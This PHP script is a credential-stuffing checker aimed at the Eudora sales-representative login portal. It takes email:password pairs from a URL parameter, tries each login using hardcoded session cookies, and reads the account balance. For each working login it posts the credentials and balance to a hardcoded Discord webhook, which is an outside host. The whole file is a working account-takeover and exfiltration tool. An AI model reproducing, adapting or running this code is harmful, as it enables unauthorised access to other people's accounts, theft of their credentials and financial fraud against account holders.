<?php
error_reporting(0);
extract($_GET);
function puxar($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];}

function filtrar($query, $value) {

    $inicio = str_replace($query, $query[0], $value);
    $fim = explode($query[0], $inicio);
    return $fim;
}
#$proxy = file_get_contents('http://localhost/lucasgomes/checker/blaze/proxy.php');

$string = $_GET['string'];
$email = filtrar(array(":","|"), $string)[0];
$senha = filtrar(array(":","|"), $string)[1];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://representante.eudora.com.br/login/logon');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "code=$email&password=$senha");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: representante.eudora.com.br';
$headers[] = 'Cookie: _vwo_uuid_v2=D2E0995E8D4CF341EA9770D679F0A9DDC|c7a68a3c573474225bf2a5f6a15e398c; userIdentity=ca0085f8-feb4-473c-ba6d-47a2d84cfcf0; _gcl_au=1.1.445742175.1704114789; utm_source=__organic__; RKT=false; AWIN=false; _zBotCookieG=GA1.3.1155226141.1704114789; _scid=05a15495-a511-42e3-a7c0-c29be2f883ba; _tt_enable_cookie=1; _ttp=ZdCXlueUyks2yyNOhXylwdCH0FR; _fbp=fb.2.1704114789771.359978431; blueID=f3b16860-2922-43d4-b3a7-78bba4285cbc; _pin_unauth=dWlkPU1HWTRabUppTXpndE1tWmxNQzAwTXpVM0xUZ3paR0l0TWpjelkySmxNbVUzWldKaA; __td_signed=true; _hjSessionUser_614071=eyJpZCI6IjIwZmE3NjU0LTEwYjItNTVhYy04MjYwLTc2ZDJhMGZiY2IyYSIsImNyZWF0ZWQiOjE3MDQxMTQ3ODk4MDAsImV4aXN0aW5nIjp0cnVlfQ==; OptanonAlertBoxClosed=2024-01-01T13:13:17.576Z; abTest=; accountStore-loggedEmails=[]; _zBotCookieG_gid=GA1.3.2022842684.1704599102; featureToggleHash=2013d73a70314f271d241a4892ed47c9; bm_sz=A57EE01DA0B9DD4FA2017D687A28AECE~YAAQlFS9yO05eVuMAQAAWMiL5BZiJ9XFsY3kfL3xn5mEATsaMg3+AAHDm3qLdXf6pI7tC6+q5WyAsJdmEPJ9Q3cQ3t19ahZTkIDkdshinpmmcQtr17y6EbhMQwfRp46U1VE0inWX+VQmNLPPtp4M874Khx4OZCiSj23fs8J3QNVf/zwlTpPQ0ZovEFn835OChc9ABzW/mcG5jtqWaNHye5WKeHo8UAd5OXmpiLY6I80RXldQR4OcCoFNTeMzbNxtl1bSfb+A+ovf2sXcDQhDv9YfSewenUHrxiXNI5rlqj/FIPKxGF8=~3622456~3421232; _source=https://www.google.com/; blzSessionId=77c8d850-9ed5-4c8f-bed4-183d7156fb09; _hjIncludedInSessionSample_614071=0; _hjSession_614071=eyJpZCI6Ijc1Njk0MDZkLTg1MjctNGViZi04ZGMxLTQyNzhkMWE4ODY2NyIsImMiOjE3MDQ2NDE0MTc3NzIsInMiOjAsInIiOjAsInNiIjoxfQ==; _hjAbsoluteSessionInProgress=0; nextPath=/; store.sid=s%3A8baQBLlgA05kUtklVHbF5.8mEYwnRGxusJcZyw72kSIqLzm3PWuPrMbWweoHF7hOE; _scid_r=05a15495-a511-42e3-a7c0-c29be2f883ba; _uetsid=23513ec0ad0f11eea89e1f4eb996b3ce; _uetvid=8281d930a8a711ee84e853c0e533b748; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Jan+07+2024+12%3A30%3A21+GMT-0300+(Hora+padr%C3%A3o+de+Bras%C3%ADlia)&version=202307.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=052f5762-dfcb-4569-9efb-5e19ef521559&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1&AwaitingReconsent=false&geolocation=BR%3BSP; cto_bundle=1pAHuF9NSm51SW0lMkZuYWVIRWJzbSUyQnRhJTJCa0tTU2ZkUG05MUFkS0VyRDc3ZFFhVm5xQjdQbHRKYTd0T2lMbGtxVkY2ZE0xTjVyZlNVRmJMTW53WUN0UEcxeUx5YUpDNVJXdnFQUk4lMkJZM1JKRzlsNzllblNBRU13QlBicHBvN29yR3VLT1lDTWZqSVB2eVJ1NCUyQks5ZUFCd0VEeXlDRzR3QUl3SHFiV0E5MXR2R1hIVUU4JTNE; _abck=BAD2EDCD69E1F26A09911E4D1D378BC2~0~YAAQlFS9yAE6eVuMAQAARd6L5AskcmPpmEnb2OkFUx8i0Qdm2GwIIstCiA9LMABFKGRuQs+e6jsIGiIgdOjucZopqq/8HYD2SaCuNj6fxrGqMDMTQCMm1dEvFiit96Vm+T36QoZXD1eR4W2cUnX919MNx/ot5wVkgpMODcTK6hLAEhwDh7LdSKop4tOrNy1/w4mRMKkdbhbAtTAcwj2zyvI7o/391LboPguRlguSJSQD/cWIGWp/4+O284vuUo4MDyoWa2ZGoZp2w0SwVHK2e4kcGXkZpG5je4V8c63SOXa/DIgZaV4GxpgIj50nAIr7uWD3StqayLB507aulOc+JXRXL4N5mqu7wh7Kl4ZoLbvzKVPoxTi83euVm+8bFD9ceD9LUR1uFPWEVvGZA18fdLoolyAj5l4PMm4j~-1~-1~-1; _td=f4e559ae-bd4d-4b7a-bc14-10a471456514; ADRUM=s=1704642040204&r=https%3A%2F%2Fwww.eudora.com.br%2Fautenticacao%2Flogin%3Fhash%3D63; _ga_ERTR7FHZP5=GS1.1.1704641417.4.1.1704642040.60.0.0; _ga_T3RWM7836W=GS1.1.1704641417.4.1.1704642040.60.0.0; ARRAffinity=6efeea396847fd437163c86448afa1978c47cdd6daa1bc5a881ba1c8e0999ce8; ARRAffinitySameSite=6efeea396847fd437163c86448afa1978c47cdd6daa1bc5a881ba1c8e0999ce8; ASP.NET_SessionId=da3bglrkhdnfuzaavl3g1haq; bm_mi=BFB2AD33510D0696A6D2F49971ABD38A~YAAQlFS9yOA6eVuMAQAAWCeW5Baq5OwRuH2283+idxKF1twAyhvP9m0Uof3kvNPNGjdcsU+U2eVKpeyzeKFcz6+8DPHvI42vHlaXfp0qDTa9QKk8lkRHbc2stZbY9whCkOxHmRicWi3Ism0V/diFx36XtgeaBQb8Eqycn6CGVfl47ZEGt3t4HZLNZeqqeAtbqsSZjXi0n2ox/8S19ACZ4L1aEGM1/HU8p0BIuVdncxqOiSAt5q6y+u6T/K7w6vxCgOFNGcWUQDbVx6k4Rk/D4j9haCfjD8dxAGLc9KSQ9q7LIM0BVk1hUBqe1fHao76Fk5ChScLn~1; bm_sv=F751DA0B10F33B55DB038405FDB195A1~YAAQlFS9yOc6eVuMAQAA5SqW5BYOfcI5tN2sMUb2/n3jgoM3wzxoNhblQrZrrz+P78vEGHPDJLI68UPk/rERpcAyFsvxA9lvTkxehXP1T26Cr0C+tkJd2dU9zMTixkziD172QAJev+qILziC8E+NUnkG31fG1W/kthjtsMXwZyNtyyUYPge56p1jCN0FoMEsrkeJHG7SsI0Ub0VBr86RI4aMVvPqf57OGTy/j6C+8gBGTFFi+iF8dq5AQxk+4JkJ2imX~1; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Jan+07+2024+12%3A41%3A37+GMT-0300+(Hora+padr%C3%A3o+de+Bras%C3%ADlia)&version=202302.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=052f5762-dfcb-4569-9efb-5e19ef521559&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1&AwaitingReconsent=false&geolocation=BR%3BSP; _gid=GA1.3.910471516.1704642097; _gat=1; _ga_6TZZX1WJH3=GS1.1.1704642097.2.0.1704642097.60.0.0; _ga=GA1.1.1155226141.1704114789; ak_bmsc=9C19B10939E05D88674A03D6A6418143~000000000000000000000000000000~YAAQlFS9yOs6eVuMAQAAPDCW5Ba5yjCui9hKkvr7sUL09KClnXR/zcgCLG7LVheNPKbq336HARM3wpYpUpuEXxWmTbGvUtSi87iyXXh6t7cOAHDsynf4BuRfRNHaM1BGTuTxt2dAWT3p/rXK5FajRKT5MWcBA0Lqg93d9TzeO8MvdhrIc+/hPKvJEJyl2QNxHF/Oyc7S/gBTYdX5oBH4NU9r9SpfBybiRjX+dbKHuJ/SSPRz5ugLC994FXRwvjbar9odiILow9hOj8L6wXi281f1X2q7sh+niZ2++tVCA9Q+kGXEOE3doEWxaPoIrik0LRa+VNgg0lXWEZcz4A6LNLdFIYIk89G/5PhmAilOVhDQI/3krAHQjNIrdl3Gz2XhWJwJcjOHjfx1wbBp469pEQ05iapNuuI0yr2kRD523JegOUsmrvIJQDaUlpc5Ewf2Z7NX3++v/EiB64e9I70KR1W7x9ek5KewPH1/3Pur0TqY0fhItDWNt86ocW/W5xUXmePn554xHib97iPVL0dyI41d/ZT2tKQhNQ0MubvbV8Wni189/l80f+7kVzoVKa8i7bub';
$headers[] = 'Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"';
$headers[] = 'X-Newrelic-Id: Vg4DVFVWCRAFVlFTAwkBUVU=';
$headers[] = 'Tracestate: 3080127@nr=0-1-2845351-520148816-25e52c3728077500----1704642113990';
$headers[] = 'Traceparent: 00-450fd051d08800f0be273fe773b87d50-25e52c3728077500-01';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
$headers[] = 'Newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4NDUzNTEiLCJhcCI6IjUyMDE0ODgxNiIsImlkIjoiMjVlNTJjMzcyODA3NzUwMCIsInRyIjoiNDUwZmQwNTFkMDg4MDBmMGJlMjczZmU3NzNiODdkNTAiLCJ0aSI6MTcwNDY0MjExMzk5MCwidGsiOiIzMDgwMTI3In19';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
$headers[] = 'Origin: https://representante.eudora.com.br';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);




$resposta1 = curl_exec($ch);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://representante.eudora.com.br/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: representante.eudora.com.br';
$headers[] = 'Cookie: _vwo_uuid_v2=D2E0995E8D4CF341EA9770D679F0A9DDC|c7a68a3c573474225bf2a5f6a15e398c; userIdentity=ca0085f8-feb4-473c-ba6d-47a2d84cfcf0; _gcl_au=1.1.445742175.1704114789; RKT=false; AWIN=false; _zBotCookieG=GA1.3.1155226141.1704114789; _scid=05a15495-a511-42e3-a7c0-c29be2f883ba; _tt_enable_cookie=1; _ttp=ZdCXlueUyks2yyNOhXylwdCH0FR; _fbp=fb.2.1704114789771.359978431; blueID=f3b16860-2922-43d4-b3a7-78bba4285cbc; _pin_unauth=dWlkPU1HWTRabUppTXpndE1tWmxNQzAwTXpVM0xUZ3paR0l0TWpjelkySmxNbVUzWldKaA; __td_signed=true; _hjSessionUser_614071=eyJpZCI6IjIwZmE3NjU0LTEwYjItNTVhYy04MjYwLTc2ZDJhMGZiY2IyYSIsImNyZWF0ZWQiOjE3MDQxMTQ3ODk4MDAsImV4aXN0aW5nIjp0cnVlfQ==; OptanonAlertBoxClosed=2024-01-01T13:13:17.576Z; abTest=; accountStore-loggedEmails=[]; _zBotCookieG_gid=GA1.3.2022842684.1704599102; bm_sz=A57EE01DA0B9DD4FA2017D687A28AECE~YAAQlFS9yO05eVuMAQAAWMiL5BZiJ9XFsY3kfL3xn5mEATsaMg3+AAHDm3qLdXf6pI7tC6+q5WyAsJdmEPJ9Q3cQ3t19ahZTkIDkdshinpmmcQtr17y6EbhMQwfRp46U1VE0inWX+VQmNLPPtp4M874Khx4OZCiSj23fs8J3QNVf/zwlTpPQ0ZovEFn835OChc9ABzW/mcG5jtqWaNHye5WKeHo8UAd5OXmpiLY6I80RXldQR4OcCoFNTeMzbNxtl1bSfb+A+ovf2sXcDQhDv9YfSewenUHrxiXNI5rlqj/FIPKxGF8=~3622456~3421232; _source=https://www.google.com/; blzSessionId=77c8d850-9ed5-4c8f-bed4-183d7156fb09; _hjIncludedInSessionSample_614071=0; _hjSession_614071=eyJpZCI6Ijc1Njk0MDZkLTg1MjctNGViZi04ZGMxLTQyNzhkMWE4ODY2NyIsImMiOjE3MDQ2NDE0MTc3NzIsInMiOjAsInIiOjAsInNiIjoxfQ==; _hjAbsoluteSessionInProgress=0; nextPath=/; _abck=BAD2EDCD69E1F26A09911E4D1D378BC2~0~YAAQlFS9yAE6eVuMAQAARd6L5AskcmPpmEnb2OkFUx8i0Qdm2GwIIstCiA9LMABFKGRuQs+e6jsIGiIgdOjucZopqq/8HYD2SaCuNj6fxrGqMDMTQCMm1dEvFiit96Vm+T36QoZXD1eR4W2cUnX919MNx/ot5wVkgpMODcTK6hLAEhwDh7LdSKop4tOrNy1/w4mRMKkdbhbAtTAcwj2zyvI7o/391LboPguRlguSJSQD/cWIGWp/4+O284vuUo4MDyoWa2ZGoZp2w0SwVHK2e4kcGXkZpG5je4V8c63SOXa/DIgZaV4GxpgIj50nAIr7uWD3StqayLB507aulOc+JXRXL4N5mqu7wh7Kl4ZoLbvzKVPoxTi83euVm+8bFD9ceD9LUR1uFPWEVvGZA18fdLoolyAj5l4PMm4j~-1~-1~-1; ARRAffinity=6efeea396847fd437163c86448afa1978c47cdd6daa1bc5a881ba1c8e0999ce8; ARRAffinitySameSite=6efeea396847fd437163c86448afa1978c47cdd6daa1bc5a881ba1c8e0999ce8; ASP.NET_SessionId=da3bglrkhdnfuzaavl3g1haq; bm_mi=BFB2AD33510D0696A6D2F49971ABD38A~YAAQlFS9yOA6eVuMAQAAWCeW5Baq5OwRuH2283+idxKF1twAyhvP9m0Uof3kvNPNGjdcsU+U2eVKpeyzeKFcz6+8DPHvI42vHlaXfp0qDTa9QKk8lkRHbc2stZbY9whCkOxHmRicWi3Ism0V/diFx36XtgeaBQb8Eqycn6CGVfl47ZEGt3t4HZLNZeqqeAtbqsSZjXi0n2ox/8S19ACZ4L1aEGM1/HU8p0BIuVdncxqOiSAt5q6y+u6T/K7w6vxCgOFNGcWUQDbVx6k4Rk/D4j9haCfjD8dxAGLc9KSQ9q7LIM0BVk1hUBqe1fHao76Fk5ChScLn~1; _gid=GA1.3.910471516.1704642097; ak_bmsc=9C19B10939E05D88674A03D6A6418143~000000000000000000000000000000~YAAQlFS9yOs6eVuMAQAAPDCW5Ba5yjCui9hKkvr7sUL09KClnXR/zcgCLG7LVheNPKbq336HARM3wpYpUpuEXxWmTbGvUtSi87iyXXh6t7cOAHDsynf4BuRfRNHaM1BGTuTxt2dAWT3p/rXK5FajRKT5MWcBA0Lqg93d9TzeO8MvdhrIc+/hPKvJEJyl2QNxHF/Oyc7S/gBTYdX5oBH4NU9r9SpfBybiRjX+dbKHuJ/SSPRz5ugLC994FXRwvjbar9odiILow9hOj8L6wXi281f1X2q7sh+niZ2++tVCA9Q+kGXEOE3doEWxaPoIrik0LRa+VNgg0lXWEZcz4A6LNLdFIYIk89G/5PhmAilOVhDQI/3krAHQjNIrdl3Gz2XhWJwJcjOHjfx1wbBp469pEQ05iapNuuI0yr2kRD523JegOUsmrvIJQDaUlpc5Ewf2Z7NX3++v/EiB64e9I70KR1W7x9ek5KewPH1/3Pur0TqY0fhItDWNt86ocW/W5xUXmePn554xHib97iPVL0dyI41d/ZT2tKQhNQ0MubvbV8Wni189/l80f+7kVzoVKa8i7bub; _hjSessionUser_609218=eyJpZCI6IjRjYzkxOTAwLTNhYTEtNWI2Yi04NDYzLWZhMTBjZGE4MGZlMiIsImNyZWF0ZWQiOjE3MDQ2NDIzNTUyOTgsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_609218=0; _hjSession_609218=eyJpZCI6IjcxYzlmMjc3LThiODgtNDAwZC05ZWMyLTY0N2ViYjU2NzAxNCIsImMiOjE3MDQ2NDIzNTUyOTksInMiOjAsInIiOjAsInNiIjowfQ==; _clck=oa9ran%7C2%7Cfi7%7C0%7C1467; utm_source=__organic__; featureToggleHash=2013d73a70314f271d241a4892ed47c9; _clsk=1n8tzyw%7C1704642752210%7C2%7C1%7Cx.clarity.ms%2Fcollect; store.sid=s%3AeyPp3rCs31rjnbMUspSVQ.CLUgFIRgpup31lQiTnWiZF6GDBvtfQhXuZn5%2BuL78Kk; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Jan+07+2024+12%3A52%3A46+GMT-0300+(Hora+padr%C3%A3o+de+Bras%C3%ADlia)&version=202307.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=052f5762-dfcb-4569-9efb-5e19ef521559&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1&AwaitingReconsent=false&geolocation=BR%3BSP; _uetsid=23513ec0ad0f11eea89e1f4eb996b3ce; _uetvid=8281d930a8a711ee84e853c0e533b748; _scid_r=05a15495-a511-42e3-a7c0-c29be2f883ba; cto_bundle=zuOEH19NSm51SW0lMkZuYWVIRWJzbSUyQnRhJTJCa0tjYjdhM1A3UExUZHR2MmkxZW9yZ0RqWFQ4S2VJVUxBcFFUd3RvWnF3JTJCYnlzc0RnbSUyQkNxT3doY0JjNXNHOTd1cDFsR0VDWlk5dnh1NTNvTjBnWURvUlJidjFoWFVPMU1PeGVQOW9nQzdnejVFMVJyNkRNTWN6aWFxbDQ4UWJDUlhUdnBrbktZdzVleFlXZ1IyR3BkJTJGWDglM0Q; _td=f4e559ae-bd4d-4b7a-bc14-10a471456514; _derived_epik=dj0yJnU9MDQ4SXZ3RjgxUVdXUUpmM2tkUWhJWWlTUjZqb1FUcl8mbj1sUDRkdEJ4MHZZLXduS3dTWFpmSXl3Jm09MTAmdD1BQUFBQUdXYXlOYyZybT0xMCZydD1BQUFBQUdXYXlOYyZzcD0x; _ga_FMKDE2B1GK=GS1.1.1704642355.1.1.1704643019.60.0.0; ADRUM=s=1704643021315&r=https%3A%2F%2Fwww.eudora.com.br%2Fautenticacao%2Flogin%3Fhash%3D63; _ga_ERTR7FHZP5=GS1.1.1704641417.4.1.1704643021.60.0.0; _ga_T3RWM7836W=GS1.1.1704641417.4.1.1704643021.60.0.0; _gat_UA-21273217-3=1; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Jan+07+2024+13%3A03%3A08+GMT-0300+(Hora+padr%C3%A3o+de+Bras%C3%ADlia)&version=202302.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=052f5762-dfcb-4569-9efb-5e19ef521559&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1&AwaitingReconsent=false&geolocation=BR%3BSP; _gat=1; _ga_6TZZX1WJH3=GS1.1.1704642097.2.1.1704643388.60.0.0; _ga=GA1.1.1155226141.1704114789; bm_sv=F751DA0B10F33B55DB038405FDB195A1~YAAQlFS9yNw9eVuMAQAA3w2q5BZCvm0TfLN/MoDblf4T+5Geie2y8ixu4ZKmRWEucFlh039v9vgwteqM1jHveTY7drE6DA+jTMUt8jrElxfhc374j/PuaI5kk8jLJ4hfnegUY3buLBSwN8fpn5PqqOmO9bQoyxEnB2PZwwTG6vUca1rCxhVNwDM0vIPLyktvr7rJxjHnmJOpT1MahOHVlATdA1uMpaoM6bHh3VEKZ3pTwjdR93MrPKO/mnoP0nvuYGJ9zA==~1';
$headers[] = 'Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resposta2 = curl_exec($ch);
$saldo = puxar($resposta2, '<p><strong>R$', '</strong></p>');


    if(strpos($resposta1, 'tokenJWT')) {
        echo "<font color='#01DF01'>#APROVADA » </font> Conta representante eudora: $email|$senha | Saldo: $saldo  - Retorno: Login efetuado com sucesso!<br>";$ini = curl_init();
    curl_setopt($ini, CURLOPT_URL, "https://discord.com/api/webhooks/1007771371180412928/fNFsTocKLaq0ljtm4EH-xqaOd68ZwwzZPNoc-x2BEIYvP5rA4QC5IOWznLhUHkPZFcM7");
    curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ini, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json'
    ));
        
    curl_setopt($ini, CURLOPT_POSTFIELDS, '{"content":" ```Live ➜ '.$email.'|'.$senha.'| Saldo: '.$saldo.'| Nivel: '.$level.'  ```"}');
    $cxtotes = curl_exec($ini);
    //echo $cxtotes;
        }else {
            echo "<font color='#FF0000'>#REPROVADA</font> <font color='#000000'>Conta nome: $email|$senha - Retorno: Email ou senha invalidos.<br>";
        }
    
      
    ?>